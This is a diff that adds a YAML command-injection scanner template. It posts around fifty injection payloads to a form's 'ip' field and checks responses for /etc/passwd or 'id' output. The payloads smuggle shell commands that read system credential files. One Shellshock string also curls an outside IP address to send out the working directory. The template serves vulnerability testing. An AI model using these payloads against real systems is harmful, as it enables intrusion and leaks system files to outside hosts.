@@ -1,0 +1,95 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - ";system('cat /etc/passwd')"
+        - "cat%20/etc/passwd"
+        - "i\"d"
+        - "; id"
+        - "cat%20/etc/passwd"
+        - "%26cat%24IFS%2Fetc%2Fpasswd"
+        - "%60id%60%26"
+        - "%7Cid"
+        - "###cat%20/etc/passwd"
+        - "`id`"
+        - ";system('cat%20/etc/passwd')"
+        - "%26%7Bsystem%28whoami%29"
+        - "%7Cid%7C"
+        - "|{cat,/etc/passwd}"
+        - "||id"
+        - "%26id"
+        - "%26%2Fusr%2Fbin%2Fid"
+        - "%26%7Bcat%2C%2Fetc%2Fpasswd%7D"
+        - "& id &"
+        - "%22id"
+        - "&&cat%20/etc/passwd"
+        - "|/usr/bin/id"
+        - "%26id"
+        - "%60id%60"
+        - "a)|id"
+        - "a);id"
+        - "%2Cid"
+        - "`id`"
+        - "%2F%20i"
+        - "&&cat%20/etc/passwd"
+        - "%22%20id"
+        - "%26id"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\\`pwd\\`\""
+        - "|id"
+        - "%26%26cat%20%2Fetc%24u%2Fpasswd"
+        - "%26cat%20%2Fetc%2Fpasswd"
+        - "|id;"
+        - "%2Aid%27%2A"
+        - "%7Cid%7Ca"
+        - "||id;"
+        - "cat%20/etc/passwd"
+        - "cat%24u%20/etc$u/passwd%24u"
+        - "%2F%22id"
+        - "%24%28cat%20%2Fetc%2Fpasswd%29"
+        - "a);id"
+        - "%60cat%24u%20%2Fetc%24u%2Fpasswd%24u%60"
+        - "%7Cid"
+        - "%29id%0A"
+        - "%26%20id%20"
+        - ";cat+/etc/passwd+#"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
